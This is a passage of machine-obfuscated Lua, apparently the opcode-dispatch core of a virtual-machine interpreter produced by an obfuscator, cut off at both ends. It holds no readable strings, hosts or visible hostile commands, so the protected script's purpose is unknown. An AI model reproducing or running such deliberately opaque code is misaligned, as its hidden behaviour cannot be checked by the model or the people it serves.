q;w[y[125]]=w[y[392]]%w[y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]]+y[54];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))else w[y[125]]();end;elseif 115>=z then local q;local x;local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];ba=y[392];x=y[54];q=k(w,g,ba,x);w[y[125]]=q;elseif z==116 then w[y[125]]=w[y[392]]+y[54];else local q;w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](w[q+1])end;elseif z<=129 then if z<=123 then if z<=120 then if z<=118 then local q,x=0 while true do if q<=12 then if q<=5 then if q<=2 then if q<=0 then x=nil else if q>1 then for ba=0,u,1 do if ba<i then w[ba]=s[ba+1];else break;end;end;else w={};end end else if q<=3 then n=n+1;else if q>4 then w[y[125]]=false;else y=e[n];end end end else if q<=8 then if q<=6 then n=n+1;else if q<8 then y=e[n];else w[y[125]]=o[y[392]];end end else if q<=10 then if 10>q then n=n+1;else y=e[n];end else if 12~=q then for ba=y[125],y[392],1 do w[ba]=nil;end;else n=n+1;end end end end else if q<=18 then if q<=15 then if q<=13 then y=e[n];else if 15>q then w[y[125]]=h[y[392]];else n=n+1;end end else if q<=16 then y=e[n];else if 18>q then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end end else if q<=21 then if q<=19 then y=e[n];else if 20<q then n=n+1;else w[y[125]]=w[y[392]];end end else if q<=23 then if q<23 then y=e[n];else x=y[125]end else if q<25 then w[x]=w[x](w[x+1])else break end end end end end q=q+1 end elseif 119<z then local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if 0==q then x=nil else w[y[125]]=w[y[392]][y[54]];end else if 2==q then n=n+1;else y=e[n];end end else if q<=5 then if q==4 then w[y[125]]=h[y[392]];else n=n+1;end else if q<=6 then y=e[n];else if 8>q then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end end end else if q<=13 then if q<=10 then if q~=10 then y=e[n];else w[y[125]]=y[392];end else if q<=11 then n=n+1;else if q==12 then y=e[n];else w[y[125]]=y[392];end end end else if q<=15 then if q~=15 then n=n+1;else y=e[n];end else if q<=16 then x=y[125]else if 17==q then w[x]=w[x](r(w,x+1,y[392]))else break end end end end end q=q+1 end else w[y[125]]=w[y[392]];end;elseif z<=121 then local q=y[125]w[q]=w[q]()elseif 123~=z then if(y[125]<w[y[54]])then n=n+1;else n=y[392];end;else for q=y[125],y[392],1 do w[q]=nil;end;end;elseif 126>=z then if(124>=z)then local q,x=0 while true do if q<=10 then if q<=4 then if q<=1 then if 0==q then x=nil else w[y[125]]=o[y[392]];end else if q<=2 then n=n+1;else if q>3 then w[y[125]]=w[y[392]][y[54]];else y=e[n];end end end else if q<=7 then if q<=5 then n=n+1;else if q>6 then w[y[125]]=y[392];else y=e[n];end end else if q<=8 then n=n+1;else if 9==q then y=e[n];else w[y[125]]=y[392];end end end end else if q<=15 then if q<=12 then if q~=12 then n=n+1;else y=e[n];end else if q<=13 then w[y[125]]=y[392];else if 15>q then n=n+1;else y=e[n];end end end else if q<=18 then if q<=16 then w[y[125]]=y[392];else if 18~=q then n=n+1;else y=e[n];end end else if q<=19 then x=y[125]else if 20<q then break else w[x]=w[x](r(w,x+1,y[392]))end end end end end q=q+1 end elseif z<126 then local q,x,ba=0 while true do if q<=24 then if q<=11 then if q<=5 then if q<=2 then if q<=0 then x=nil else if 1<q then w[y[125]]={};else ba=nil end end else if q<=3 then n=n+1;else if q<5 then y=e[n];else w[y[125]]=h[y[392]];end end end else if q<=8 then if q<=6 then n=n+1;else if 8~=q then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end else if q<=9 then n=n+1;else if 10<q then w[y[125]]=h[y[392]];else y=e[n];end end end end else if q<=17 then if q<=14 then if q<=12 then n=n+1;else if q==13 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end else if q<=15 then n=n+1;else if 17>q then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end else if q<=20 then if q<=18 then n=n+1;else if 19==q then y=e[n];else w[y[125]]={};end end else if q<=22 then if 21<q then y=e[n];else n=n+1;end else if q~=24 then w[y[125]]={};else n=n+1;end end end end end else if q<=37 then if q<=30 then if q<=27 then if q<=25 then y=e[n];else if q<27 then w[y[125]]=h[y[392]];else n=n+1;end end else if q<=28 then y=e[n];else if q<30 then w[y[125]][y[392]]=w[y[54]];else n=n+1;end end end else if q<=33 then if q<=31 then y=e[n];else if q>32 then n=n+1;else w[y[125]]=h[y[392]];end end else if q<=35 then if q>34 then w[y[125]][y[392]]=w[y[54]];else y=e[n];end else if q~=37 then n=n+1;else y=e[n];end end end end else if q<=43 then if q<=40 then if q<=38 then w[y[125]][y[392]]=w[y[54]];else if q==39 then n=n+1;else y=e[n];end end else if q<=41 then w[y[125]]={r({},1,y[392])};else if 42<q then y=e[n];else n=n+1;end end end else if q<=46 then if q<=44 then w[y[125]]=w[y[392]];else if q>45 then y=e[n];else n=n+1;end end else if q<=48 then if 48>q then ba=y[125];else x=w[ba];end else if q<50 then for bb=ba+1,y[392]do t(x,w[bb])end;else break end end end end end end q=q+1 end else w[y[125]]={};end;elseif z<=127 then local q=y[392];local x=y[54];local q=k(w,g,q,x);w[y[125]]=q;elseif 128==z then local q=y[125];local x=w[y[392]];w[q+1]=x;w[q]=x[w[y[54]]];else local q=y[125]local x={w[q](r(w,q+1,y[392]))};local ba=0;for bb=q,y[54]do ba=ba+1;w[bb]=x[ba];end;end;elseif z<=135 then if 132>=z then if 130>=z then local q=y[125]local x={w[q](r(w,q+1,p))};local ba=0;for bb=q,y[54]do ba=ba+1;w[bb]=x[ba];end elseif 132~=z then local q;local x,ba;local bb;w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];bb=y[125]x,ba=j(w[bb](r(w,bb+1,y[392])))p=ba+bb-1 q=0;for ba=bb,p do q=q+1;w[ba]=x[q];end;else local q;local x;local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];ba=y[125]x={w[ba](w[ba+1])};q=0;for bb=ba,y[54]do q=q+1;w[bb]=x[q];end end;elseif z<=133 then local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](w[q+1])elseif 135>z then w[y[125]][y[392]]=y[54];else local q;w={};for x=0,u,1 do if x<i then w[x]=s[x+1];else break;end;end;n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))end;elseif 138>=z then if z<=136 then w={};for q=0,u,1 do if q<i then w[q]=s[q+1];else break;end;end;n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];if w[y[125]]then n=n+1;else n=y[392];end;elseif 137==z then local q=y[125]local x={w[q](r(w,q+1,p))};local ba=0;for bb=q,y[54]do ba=ba+1;w[bb]=x[ba];end else local q;w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))end;elseif z<=139 then local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))elseif 140<z then local q;local x;local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];ba=y[125]x={w[ba](w[ba+1])};q=0;for bb=ba,y[54]do q=q+1;w[bb]=x[q];end else local q;local x;local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];ba=y[125]x={w[ba](w[ba+1])};q=0;for bb=ba,y[54]do q=q+1;w[bb]=x[q];end end;elseif z<=165 then if z<=153 then if 147>=z then if z<=144 then if z<=142 then local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]]*y[54];n=n+1;y=e[n];w[y[125]]=w[y[392]]+w[y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]]+w[y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))elseif z~=144 then local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]]*y[54];n=n+1;y=e[n];w[y[125]]=w[y[392]]+w[y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]]+w[y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))else if w[y[125]]then n=n+1;else n=y[392];end;end;elseif 145>=z then local q;local x;w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]={r({},1,y[392])};n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];x=y[125];q=w[x];for ba=x+1,y[392]do t(q,w[ba])end;elseif z~=147 then local q;local x;local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];ba=y[125]x={w[ba](w[ba+1])};q=0;for bb=ba,y[54]do q=q+1;w[bb]=x[q];end else w[y[125]]();end;elseif z<=150 then if 148>=z then local q=y[125];local x=w[y[392]];w[q+1]=x;w[q]=x[w[y[54]]];elseif z>149 then local q;w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];q=y[125]w[q]=w[q]()else local q;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))end;elseif z<=151 then local q;w={};for x=0,u,1 do if x<i then w[x]=s[x+1];else break;end;end;n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))elseif z>152 then local q;w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](w[q+1])else local q=y[125]w[q]=w[q](r(w,q+1,y[392]))end;elseif z<=159 then if z<=156 then if 154>=z then w={};for q=0,u,1 do if q<i then w[q]=s[q+1];else break;end;end;n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];if w[y[125]]then n=n+1;else n=y[392];end;elseif z==155 then local q;w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][y[392]]=y[54];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))else local q;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))end;elseif z<=157 then n=y[392];elseif 158<z then local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))else w[y[125]]=w[y[392]]-w[y[54]];end;elseif z<=162 then if z<=160 then local q=y[125];local x=y[54];local ba=q+2;local bb={w[q](w[q+1],w[ba])};for bc=1,x do w[ba+bc]=bb[bc];end local q=w[q+3];if q then w[ba]=q;n=y[392];else n=n+1 end;elseif z~=162 then local q;local x;local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];ba=y[125]x={w[ba](w[ba+1])};q=0;for bb=ba,y[54]do q=q+1;w[bb]=x[q];end else local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q]()end;elseif 163>=z then local q=y[125]local x={}for ba=1,#v do local bb=v[ba]for bc=1,#bb do local bb=bb[bc]local bc,bc=bb[1],bb[2]if bc>=q then x[bc]=w[bc]bb[1]=x v[ba]=nil;end end end elseif z~=165 then local q;w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];q=y[125]w[q]=w[q]()else w[y[125]]=y[392]*w[y[54]];end;elseif 177>=z then if 171>=z then if 168>=z then if(166>=z)then local q=0 while true do if q<=6 then if q<=2 then if q<=0 then w[y[125]]=w[y[392]][y[54]];else if 2~=q then n=n+1;else y=e[n];end end else if q<=4 then if q~=4 then w[y[125]]=w[y[392]][y[54]];else n=n+1;end else if q~=6 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end else if q<=9 then if q<=7 then n=n+1;else if 8==q then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end else if q<=11 then if q==10 then n=n+1;else y=e[n];end else if 12==q then if w[y[125]]then n=n+1;else n=y[392];end;else break end end end end q=q+1 end elseif(167<z)then local q=y[125];do return r(w,q,p)end;else local q,x,ba=0 while true do if q<=24 then if q<=11 then if q<=5 then if q<=2 then if q<=0 then x=nil else if 1<q then w[y[125]]={};else ba=nil end end else if q<=3 then n=n+1;else if q<5 then y=e[n];else w[y[125]]=h[y[392]];end end end else if q<=8 then if q<=6 then n=n+1;else if q~=8 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end else if q<=9 then n=n+1;else if 10==q then y=e[n];else w[y[125]]=h[y[392]];end end end end else if q<=17 then if q<=14 then if q<=12 then n=n+1;else if q==13 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end else if q<=15 then n=n+1;else if q==16 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end else if q<=20 then if q<=18 then n=n+1;else if 20>q then y=e[n];else w[y[125]]={};end end else if q<=22 then if q==21 then n=n+1;else y=e[n];end else if q>23 then n=n+1;else w[y[125]]={};end end end end end else if q<=37 then if q<=30 then if q<=27 then if q<=25 then y=e[n];else if 26==q then w[y[125]]=h[y[392]];else n=n+1;end end else if q<=28 then y=e[n];else if 30>q then w[y[125]][y[392]]=w[y[54]];else n=n+1;end end end else if q<=33 then if q<=31 then y=e[n];else if 33~=q then w[y[125]]=h[y[392]];else n=n+1;end end else if q<=35 then if q~=35 then y=e[n];else w[y[125]][y[392]]=w[y[54]];end else if q~=37 then n=n+1;else y=e[n];end end end end else if q<=43 then if q<=40 then if q<=38 then w[y[125]][y[392]]=w[y[54]];else if q==39 then n=n+1;else y=e[n];end end else if q<=41 then w[y[125]]={r({},1,y[392])};else if q~=43 then n=n+1;else y=e[n];end end end else if q<=46 then if q<=44 then w[y[125]]=w[y[392]];else if 45==q then n=n+1;else y=e[n];end end else if q<=48 then if q~=48 then ba=y[125];else x=w[ba];end else if q>49 then break else for bb=ba+1,y[392]do t(x,w[bb])end;end end end end end end q=q+1 end end;elseif z<=169 then local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q>0 then w[y[125]]=w[y[392]];else x=nil end else if q<3 then n=n+1;else y=e[n];end end else if q<=5 then if 4<q then n=n+1;else w[y[125]]=y[392];end else if 7>q then y=e[n];else w[y[125]]=y[392];end end end else if q<=11 then if q<=9 then if 9~=q then n=n+1;else y=e[n];end else if 10<q then n=n+1;else w[y[125]]=y[392];end end else if q<=13 then if q~=13 then y=e[n];else x=y[125]end else if 14==q then w[x]=w[x](r(w,x+1,y[392]))else break end end end end q=q+1 end elseif 170==z then local q=y[125]w[q]=w[q]()else local q;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))end;elseif 174>=z then if 172>=z then w={};for q=0,u,1 do if q<i then w[q]=s[q+1];else break;end;end;n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]]+y[54];n=n+1;y=e[n];h[y[392]]=w[y[125]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]();elseif 174>z then w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];if w[y[125]]then n=n+1;else n=y[392];end;else local q;local x;local ba;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];ba=y[392];x=y[54];q=k(w,g,ba,x);w[y[125]]=q;end;elseif z<=175 then local q;local x;w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];x=y[125];q=w[y[392]];w[x+1]=q;w[x]=q[w[y[54]]];elseif z==176 then w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];if w[y[125]]then n=n+1;else n=y[392];end;else a(c,f);n=n+1;y=e[n];w={};for q=0,u,1 do if q<i then w[q]=s[q+1];else break;end;end;n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];end;elseif 183>=z then if z<=180 then if 178>=z then local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if 1>q then x=nil else w[y[125]]=h[y[392]];end else if 2==q then n=n+1;else y=e[n];end end else if q<=5 then if 5>q then w[y[125]]=y[392];else n=n+1;end else if 6==q then y=e[n];else w[y[125]]=y[392];end end end else if q<=11 then if q<=9 then if 8==q then n=n+1;else y=e[n];end else if q~=11 then w[y[125]]=y[392];else n=n+1;end end else if q<=13 then if q>12 then x=y[125]else y=e[n];end else if q<15 then w[x]=w[x](r(w,x+1,y[392]))else break end end end end q=q+1 end elseif z<180 then local q;w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q]()else w[y[125]]=w[y[392]]%y[54];end;elseif 181>=z then o[y[392]]=w[y[125]];elseif z~=183 then w[y[125]]=false;else local q;local x,ba;local bb;w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];bb=y[125]x,ba=j(w[bb](r(w,bb+1,y[392])))p=ba+bb-1 q=0;for ba=bb,p do q=q+1;w[ba]=x[q];end;end;elseif z<=186 then if 184>=z then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if q>0 then ba=nil else x=nil end else if q<=2 then bb=nil else if 3==q then w[y[125]]=h[y[392]];else n=n+1;end end end else if q<=6 then if q<6 then y=e[n];else w[y[125]]=h[y[392]];end else if q<=7 then n=n+1;else if 8==q then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end end else if q<=14 then if q<=11 then if 10==q then n=n+1;else y=e[n];end else if q<=12 then w[y[125]]=w[y[392]][w[y[54]]];else if q<14 then n=n+1;else y=e[n];end end end else if q<=16 then if q>15 then ba={w[bb](w[bb+1])};else bb=y[125]end else if q<=17 then x=0;else if 18<q then break else for bc=bb,y[54]do x=x+1;w[bc]=ba[x];end end end end end end q=q+1 end elseif z>185 then for q=y[125],y[392],1 do w[q]=nil;end;else w[y[125]]=w[y[392]][y[54]];end;elseif 187>=z then local q;w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))elseif z~=189 then local q;w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];q=y[125]w[q]=w[q]()else local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=false;n=n+1;y=e[n];q=y[125]w[q](w[q+1])end;elseif 284>=z then if 236>=z then if 212>=z then if 200>=z then if 194>=z then if 191>=z then if z<191 then local q;w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))else w={};for q=0,u,1 do if q<i then w[q]=s[q+1];else break;end;end;end;elseif 192>=z then local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]]*y[54];n=n+1;y=e[n];w[y[125]]=w[y[392]]+w[y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]]+w[y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))elseif 194~=z then w[y[125]]={};else w[y[125]]=true;end;elseif 197>=z then if z<=195 then local q=y[125]w[q](r(w,q+1,p))elseif 196==z then local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](w[q+1])else local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))end;elseif 198>=z then local 